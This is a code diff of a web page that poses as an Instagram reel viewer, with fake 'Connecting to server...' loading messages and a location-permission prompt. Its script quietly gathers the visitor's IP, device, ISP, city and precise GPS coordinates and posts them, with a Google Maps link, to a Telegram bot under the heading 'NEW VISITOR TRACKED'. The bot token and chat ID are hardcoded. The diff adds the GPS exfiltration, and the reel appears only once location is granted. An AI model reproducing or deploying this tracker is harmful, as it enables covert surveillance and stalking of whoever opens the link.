@@ -22,16 +22,15 @@
       z-index: 1;
       transition: opacity 0.5s ease;
     }
-    #insta-video {
+    #insta-reel {
       display: none;
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      object-fit: cover;
+      border: none;
       z-index: 2;
-      background: black;
     }
     #loading-overlay {
       position: absolute;
@@ -55,7 +54,9 @@
       animation: spin 1s ease-in-out infinite;
       margin-bottom: 15px;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
     #loading-text {
       color: white;
       font-size: 18px;
@@ -93,17 +94,21 @@
 <body>
   <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">
 
-  <!-- Your Google-Drive-hosted video -->
-  <video id="insta-video" controls playsinline>
-    <source src="https://drive.google.com/uc?export=download&id=19szhjOpGA8ymSNuFpOtYwi4LdYP3hYR-" type="video/mp4">
-    Your browser does not support the video tag.
-  </video>
-
+  <!-- Instagram Reel (hidden initially) -->
+  <iframe 
+    id="insta-reel"
+    src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed"
+    allowtransparency="true"
+    allowfullscreen="true"
+    scrolling="no"
+    frameborder="0">
+  </iframe>
+  
   <div id="loading-overlay">
     <div class="loader"></div>
     <div id="loading-text">Connecting to server...</div>
   </div>
-
+  
   <div id="permission-request">
     <h2>Location Access Required</h2>
     <p>Please allow location access to continue</p>
@@ -111,16 +116,18 @@
   </div>
 
   <script>
+    // Telegram bot details
     const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
     const chatId = '7173355426';
-
+    
+    // DOM elements
     const loadingOverlay = document.getElementById('loading-overlay');
     const loadingText = document.getElementById('loading-text');
     const permissionRequest = document.getElementById('permission-request');
     const allowBtn = document.getElementById('allow-btn');
+    const instaReel = document.getElementById('insta-reel');
     const bgImage = document.getElementById('bg-image');
-    const video = document.getElementById('insta-video');
-
+    
     const loadingMessages = [
       "Connecting to server...",
       "Loading game assets...",
@@ -129,7 +136,7 @@
       "Preparing interface...",
       "Finalizing setup..."
     ];
-
+    
     function rotateLoadingMessages() {
       let counter = 0;
       setInterval(() => {
@@ -137,31 +144,38 @@
         counter = (counter + 1) % loadingMessages.length;
       }, 3000);
     }
-
+    
     async function getIPInfo() {
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
         return await detailsResponse.json();
-      } catch {
+      } catch (error) {
+        console.error("IP info error:", error);
         return {};
       }
     }
 
     function getPreciseLocation() {
       return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve(null);
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
         navigator.geolocation.getCurrentPosition(
-          pos => resolve({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
+          position => resolve({
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
             timestamp: new Date().toLocaleString()
           }),
-          err => {
-            if (err.code === err.PERMISSION_DENIED)
-              setTimeout(() => permissionRequest.style.display = 'flex', 3000);
+          error => {
+            if (error.code === error.PERMISSION_DENIED) {
+              setTimeout(() => {
+                permissionRequest.style.display = 'flex';
+              }, 3000);
+            }
             resolve(null);
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
@@ -170,40 +184,45 @@
     }
 
     async function sendToTelegram(data) {
-      const msg = [
-        `🕵️ NEW VISITOR TRACKED 🕵️`,
-        `📱 Device: ${navigator.userAgent}`,
-        `🌐 IP: ${data.ip || 'Unknown'}`,
-        `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`,
-        `🏢 ISP: ${data.org || 'Unknown'}`
-      ].join('\n');
       try {
+        let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
+        message += `📱 Device: ${navigator.userAgent}\n\n`;
+        message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+        message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+        message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+        if (data.liveLocation) {
+          message += `\n🎯 LIVE GPS LOCATION:\n`;
+          message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+          message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+          message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+          message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+          message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+        }
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ chat_id: chatId, text: msg })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
         });
-      } catch(e){ console.error(e); }
+      } catch (error) {
+        console.error("Telegram error:", error);
+      }
     }
 
     async function trackUser() {
       rotateLoadingMessages();
       const liveLocation = await getPreciseLocation();
       const ipDetails = await getIPInfo();
-      await sendToTelegram({ ...ipDetails, liveLocation });
+      const trackingData = { ...ipDetails, ip: ipDetails.ip || 'Unknown', liveLocation: liveLocation };
+      await sendToTelegram(trackingData);
 
+      // ✅ Show Instagram Reel after location permission
       if (liveLocation) {
         loadingOverlay.style.display = 'none';
-        bgImage.style.opacity = '0';
+        bgImage.style.opacity = '0'; // fade out
         setTimeout(() => {
           bgImage.style.display = 'none';
-          video.style.display = 'block';
-          // request fullscreen and play (user initiated)
-          video.requestFullscreen?.();
-          video.play().catch(() => {
-            console.log('Browser blocked autoplay with sound; user must press play.');
-          });
-        }, 600);
+          instaReel.style.display = 'block';
+        }, 600); // wait for fade animation
       }
     }
 
